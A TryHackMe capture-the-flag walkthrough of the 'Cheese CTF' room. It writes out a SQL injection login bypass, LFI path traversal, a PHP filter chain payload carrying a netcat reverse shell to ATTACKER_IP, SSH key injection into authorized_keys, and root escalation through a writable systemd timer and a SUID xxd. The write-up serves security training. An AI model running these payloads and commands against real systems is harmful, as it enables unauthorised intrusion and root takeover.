# Cheese CTF — TryHackMe Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Category](https://img.shields.io/badge/Category-Web%20%7C%20PrivEsc-blue)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)

**Room:** [https://tryhackme.com/room/cheesectfv10](https://tryhackme.com/room/cheesectfv10)  
**Author:** whiteghost  
**Date:** April 2026

---

## Summary

Cheese CTF is a beginner-friendly Linux machine that chains several classic vulnerabilities together. The attack path starts with a SQL injection login bypass, pivots through a Local File Inclusion vulnerability exploited via PHP filter chain RCE, and escalates to root through a writable systemd timer that creates a SUID `xxd` binary.

---

## Attack Chain Overview

```
Login Page (SQLi bypass)
    └─ /secret-script.php?file= (LFI)
        └─ PHP Filter Chain (RCE)
            └─ Shell as www-data
                └─ Writable authorized_keys → SSH as comte
                    └─ Fix exploit.timer → SUID xxd created
                        └─ xxd writes SSH key → ROOT
```

---

## Reconnaissance

>  **Note:** Port scanning with nmap is ineffective on this machine due to port spoofing — it reports hundreds of fake open ports. Skip nmap and go directly to port 80 and 22.

**Real services:**
- **Port 80** — PHP web application (Cheese Shop)
- **Port 22** — SSH

---

##  Phase 1 — SQL Injection Login Bypass

**URL:** `http://<TARGET_IP>/login.php`

**Payload used:**
```
Username: ' || 1=1;-- -
Password: anything
```

**How it works:**

The login form builds a SQL query like this behind the scenes:
```sql
SELECT * FROM users WHERE username='INPUT' AND password='INPUT'
```

After injection it becomes:
```sql
SELECT * FROM users WHERE username='' || 1=1;-- - AND password='...'
```

- `'` closes the username string
- `|| 1=1` means "OR true" — condition is always true
- `-- -` comments out the rest of the query including the password check

**Result:** Redirected to `/secret-script.php?file=supersecretadminpanel.html` as admin.

---

##  Phase 2 — Local File Inclusion (LFI) Discovery

**URL tested:**
```
http://<TARGET_IP>/secret-script.php?file=../../../../etc/passwd
```

Reading the PHP source via filters confirmed the vulnerability:
```php
<?php
  if(isset($_GET['file'])) {
    $file = $_GET['file'];
    include($file);  // no sanitization!
  }
?>
```

The `include()` function takes whatever is in `?file=` and loads it directly. The `../../../../` traverses up directory levels to reach the filesystem root.

**Result:** Able to read any file on the server.

---

##  Phase 3 — LFI → Remote Code Execution via PHP Filter Chain

**How it works:**

PHP has built-in stream filters like `php://filter/convert.base64-encode`. The PHP filter chain technique chains dozens of these filters together in a specific sequence that generates arbitrary PHP code **in memory** — without ever writing a file to disk.

**Commands:**
```bash
# Clone the generator tool
git clone https://github.com/synacktiv/php_filter_chain_generator.git
cd php_filter_chain_generator

# Generate reverse shell payload
python3 php_filter_chain_generator.py \
  --chain '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f"); ?>' \
  | grep '^php' > payload.txt

# Start listener (in a new terminal)
nc -lvnp 4444

# Trigger the payload
curl -s "http://<TARGET_IP>/secret-script.php?file=$(cat payload.txt)"
```

**Stabilize the shell:**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

**Result:** Shell as `www-data`.

---

##  Phase 4 — Lateral Movement to User `comte`

**Finding the writable file:**
```bash
find / -type f -writable 2>/dev/null | grep -Ev '^(/proc|/snap|/sys|/dev)'
```

Output revealed:
```
/home/comte/.ssh/authorized_keys   ← key target
/etc/systemd/system/exploit.timer  ← for later
```

**SSH supports key-based authentication** — if your public key is in a user's `authorized_keys`, you can log in as them without a password.

**Commands:**
```bash
# On attack machine — generate SSH keypair
ssh-keygen -f id_ed25519 -t ed25519

# In www-data shell — write public key to comte's authorized_keys
echo 'ssh-ed25519 AAAA...YOUR_PUBLIC_KEY...' > /home/comte/.ssh/authorized_keys

# On attack machine — SSH in as comte
ssh -i id_ed25519 comte@<TARGET_IP>

# Get user flag
cat ~/user.txt
```

**Result:** Shell as `comte`. User flag captured. 

```
User flag: THM{REDACTED}
```

---

##  Phase 5 — Privilege Escalation via Systemd Timer

**Check sudo permissions:**
```bash
sudo -l
```

Output:
```
(ALL) NOPASSWD: /bin/systemctl daemon-reload
(ALL) NOPASSWD: /bin/systemctl restart exploit.timer
(ALL) NOPASSWD: /bin/systemctl start exploit.timer
(ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```

**Check what the service does:**
```bash
cat /etc/systemd/system/exploit.service
```

```
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
```

This copies `xxd` to `/opt` and sets the **SUID bit** — meaning it runs as root regardless of who calls it.

**The timer had a syntax error:**
```bash
cat /etc/systemd/system/exploit.timer
# [Timer]
# OnBootSec=    ← empty! causes failure
```

**Fix the timer** (it is world-writable):
```bash
nano /etc/systemd/system/exploit.timer
# Change: OnBootSec=
# To:     OnBootSec=5s
```

**Trigger it:**
```bash
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl start exploit.timer
sleep 6 && ls -la /opt/xxd
# -rwsr-sr-x 1 root root ... /opt/xxd  ← SUID confirmed
```

**Result:** `/opt/xxd` created with SUID root permissions.

---

##  Phase 6 — Root via SUID `xxd`

**How it works:**

`xxd` converts files to hex and back. With SUID set, `/opt/xxd` runs as **root** — meaning it can write to any file on the system, including `/root/.ssh/authorized_keys`.

Reference: [GTFObins — xxd](https://gtfobins.github.io/gtfobins/xxd/)

**Commands:**
```bash
# Write your SSH public key to root's authorized_keys
echo 'ssh-ed25519 AAAA...YOUR_PUBLIC_KEY...' | xxd | /opt/xxd -r - /root/.ssh/authorized_keys

# SSH in as root
ssh -i id_ed25519 root@<TARGET_IP>

# Get root flag
cat /root/root.txt
```

**Result:** Root shell obtained. Root flag captured. 

```
Root flag: THM{REDACTED}
```

---

## Vulnerability Summary

| Vulnerability | Location | Impact |
|---|---|---|
| SQL Injection | `/login.php` | Authentication bypass |
| Local File Inclusion | `/secret-script.php?file=` | Read arbitrary files |
| PHP Filter Chain RCE | LFI endpoint | Remote code execution |
| Writable `authorized_keys` | `/home/comte/.ssh/` | Lateral movement |
| World-writable systemd timer | `/etc/systemd/system/exploit.timer` | Privilege escalation |
| SUID `xxd` abuse | `/opt/xxd` | Root access |

---

##  Tools Used

| Tool | Purpose |
|---|---|
| `nc` (netcat) | Reverse shell listener |
| `php_filter_chain_generator` | LFI to RCE payload generation |
| `ssh-keygen` | SSH keypair generation |
| `nano` | Editing the systemd timer file |
| `xxd` | Writing SSH key to root (GTFObins) |
| `find` | Enumerating writable files |

---

##  Key Concepts Learned

| Concept | Explanation |
|---|---|
| SQL Injection | Injecting SQL code to bypass login authentication |
| Local File Inclusion | Unsanitized `include()` allows reading server files |
| PHP Filter Chain RCE | Chaining PHP stream filters to execute arbitrary code |
| SSH key injection | Writing public key to `authorized_keys` for passwordless login |
| Systemd timer abuse | Exploiting writable timer files with sudo privileges |
| SUID binary exploitation | Abusing SUID bit to write files as root |

---

